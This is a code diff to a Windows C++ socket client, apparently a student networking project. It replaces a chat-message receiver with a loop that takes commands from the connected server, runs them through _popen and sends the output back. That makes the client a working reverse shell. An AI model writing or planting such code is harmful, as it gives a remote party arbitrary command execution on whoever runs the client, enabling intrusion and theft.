@@ -1,6 +1,7 @@
 #include <iostream>
 #include <WinSock2.h>
 #include <ws2tcpip.h>
+#include <array>
 
 #pragma comment(lib, "ws2_32.lib");  // link thu vien ws2_32.lib de su dung cac ham cua thu vien nay
 using namespace std;
@@ -63,11 +64,54 @@ void receiveMessage(SOCKET clientSocket){
     }
 }
 
+string executeCommand(const string &command){
+    array <char, 128> buffer;
+    string result;
+
+    FILE *pipe = _popen(command.c_str(), "r");
+    if(!pipe) return "Command execution failed!";
+
+    while(fgets(buffer.data(), buffer.size(), pipe) != nullptr){
+        result += buffer.data();
+    }
+    _pclose(pipe);
+
+    return result;
+}
+
+void handleServerCommands(SOCKET clientSocket){
+    while(true){
+        char buffer[10000];
+        int iResult = recv(clientSocket, buffer, sizeof(buffer) -1, 0);
+        
+        if(iResult > 0){
+            buffer[iResult] = '\0';
+            string command(buffer);
+
+            if (command == "exit") break;
+
+            string result = executeCommand(command);
+            send(clientSocket, result.c_str(), result.length(), 0);
+        }else if(iResult == 0){
+            cout << "Connection close!" << endl;
+            break;
+
+        }else {
+            cerr << "Recv failed!" << endl;
+            break;
+        }
+
+    }
+}
+
 int main(){
     initClientSocket();
     SOCKET clientSocket = createClientSocket();
     cout << "Connected to the server!" << endl;
-    receiveMessage(clientSocket);
+    // receiveMessage(clientSocket);
+
+    handleServerCommands(clientSocket);
+    
 
     return 0;
 }
